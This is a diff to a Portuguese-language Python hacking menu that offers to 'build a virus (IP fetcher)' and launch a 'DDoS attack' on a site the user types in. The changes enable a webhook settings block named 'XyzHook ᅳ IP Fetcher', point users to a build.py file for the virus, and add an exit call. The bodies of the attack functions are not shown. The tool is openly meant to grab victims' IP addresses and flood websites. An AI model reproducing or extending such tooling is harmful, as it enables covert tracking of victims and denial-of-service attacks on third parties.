@@ -20,12 +20,12 @@ print(f'{FORE.BLUE}[1] {FORE.MAGENTA} - {FORE.YELLOW}Construir Virus (IP FETCHER
 print(f'{FORE.BLUE}[2] {FORE.MAGENTA} - {FORE.RED}Ataque DDOs{FORE.WHITE}')
 print(f'{FORE.BLUE}[3] {FORE.MAGENTA} - {FORE.GREEN}Sair{FORE.WHITE}')
 choice = input(f"{FORE.RED}$> ")
-#settings = {
-#    "webtoken": "",
-#    "username": "XyzHook ᅳ IP Fetcher"
-#}
-#webtoken=settings['webtoken']
-#username=settings['username']
+settings = {
+    "webtoken": "",
+    "username": "XyzHook ᅳ IP Fetcher"
+}
+webtoken=settings['webtoken']
+username=settings['username']
 
     
 
@@ -47,7 +47,7 @@ def ddos(site):
 
 def check():
     if int(choice) == 1:
-        print('Em breve.')
+        print("Por favor, abre ou baixe o arquivo build.py")
     elif int(choice) == 2:
         site = input("Insira o site alvo: ")
         ddos(site)
@@ -55,4 +55,5 @@ def check():
         exit()
     else:
         print('Escolha invalida!')
+    exit()
 check()
